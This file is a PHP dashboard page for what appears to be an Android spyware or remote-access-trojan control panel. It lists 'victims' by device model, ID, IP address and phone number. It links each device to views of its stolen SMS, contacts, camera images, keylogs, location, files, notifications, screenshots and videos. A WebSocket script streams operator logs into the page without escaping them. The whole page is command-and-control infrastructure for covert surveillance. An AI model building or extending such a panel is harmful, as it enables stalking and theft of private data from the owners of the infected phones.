<?php require_once __DIR__ . "/header.php"; ?>

<div class="container">
    <div class="page-title">
        <h3>Dashboard</h3>
    </div>
    <div class="box box-primary" style="height: 400px;overflow-y: auto;">
        <div class="box-body">
            <table width="100%" class="table table-hover" id="dataTables-example">
                <thead>
                    <tr>
                        <th>Model</th>
                        <th>Device-ID</th>
                        <th>IP Address</th>
                        <th>Device API</th>
                        <th>Phone</th>
                        <th></th>
                    </tr>
                </thead>
                <tbody class="victims-body">
                    <?php foreach($clients as $client): ?>
                      <tr>
                          <td><?= $client->getModel(); ?></td>
                          <td><?= $client->getDeviceID(); ?></td>
                          <td><?= $client->getIPAddress(); ?></td>
                          <td><?= $client->getDeviceAPI(); ?></td>
                          <td><?= $client->getPhone(); ?></td>
                          <td class="text-end">
                              <a target="_blank" href="/messages?client=<?= $client->getID(); ?>" id="btn-sms" class="btn btn-outline-danger btn-rounded"><i class="fas fa-sms"></i></a>
                              <a target="_blank" href="/contacts?client=<?= $client->getID(); ?>" id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></a>
                              <a target="_blank" href="/images?client=<?= $client->getID(); ?>" id="btn-camera" class="btn btn-outline-primary btn-rounded"><i class="fas fa-camera"></i></a>
                              <a target="_blank" href="/keylogs?client=<?= $client->getID(); ?>" id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-keyboard"></i></a>
                              <a target="_blank" href="/location?client=<?= $client->getID(); ?>" id="btn-location" class="btn btn-outline-dark btn-rounded"><i class="fas fa-map-marker-alt"></i></a>
                              <a target="_blank" href="/installed-apps?client=<?= $client->getID(); ?>" id="btn-application" class="btn btn-outline-dark btn-rounded"><i class="fab fa-google-play"></i></a>
                              <a target="_blank" href="/files?client=<?= $client->getID(); ?>" id="btn-files" class="btn btn-outline-dark btn-rounded"><i class="fas fa-file"></i></a>
                              <a target="_blank" href="/notifications?client=<?= $client->getID(); ?>" id="btn-notification" class="btn btn-outline-dark btn-rounded"><i class="fas fa-bell"></i></a>
                              <a target="_blank" href="/screenshots?client=<?= $client->getID(); ?>" id="btn-screenshot" class="btn btn-outline-dark btn-rounded"><i class="fas fa-desktop"></i></a>
                              <a target="_blank" href="/videos?client=<?= $client->getID(); ?>" id="btn-video" class="btn btn-outline-dark btn-rounded"><i class="fas fa-video"></i></a>
                          </td>
                      </tr>  
                    <?php endforeach ?>
                </tbody>
            </table>

          
        </div>
    </div>
</div>

<div style="overflow-x:auto;width:100%;white-space: normal;height: 150px;" class="container dark-box">
    <div id="logs" class="row box-body log-class" style="font-family: 'Courier Prime', monospace;">
        
    </div>
</div>


<?php require_once __DIR__ . "/footer.php"; ?>

<script defer>
    // Establish WebSocket connection
    const ws = new WebSocket('ws://localhost:8080');
    
     // Listen for the WebSocket connection to open
     ws.addEventListener('open', function (event) {
        console.log('WebSocket connection opened.');

        // Data to send
        var data = {"type" : "js-server"};

        // Send data when the connection is open
        ws.send(JSON.stringify(data));

        console.log(event);
        const logElement = document.getElementById('logs');
        var message = JSON.parse(event.data)
        logElement.innerHTML += `<div class="col-12 ${message['color']}">${message['message']}</div>`;
        logElement.scrollTop = logElement.scrollHeight;
    });

    // Display received messages in the log
    ws.addEventListener('message', function(event) {
        console.log(event);
        const logElement = document.getElementById('logs');
        var message = JSON.parse(event.data)
        logElement.innerHTML += `<div class="col-12 ${message['color']}">${message['message']}</div>`;
        logElement.scrollTop = logElement.scrollHeight;
    });
    

    // Handle errors
    ws.addEventListener('error', function(event) {
        console.log(event);
        const logElement = document.getElementById('logs');
        var message = JSON.parse(event.data)
        logElement.innerHTML += `<div class="col-12 ${message['color']}">${message['message']}</div>`;
        logElement.scrollTop = logElement.scrollHeight;
    });
</script>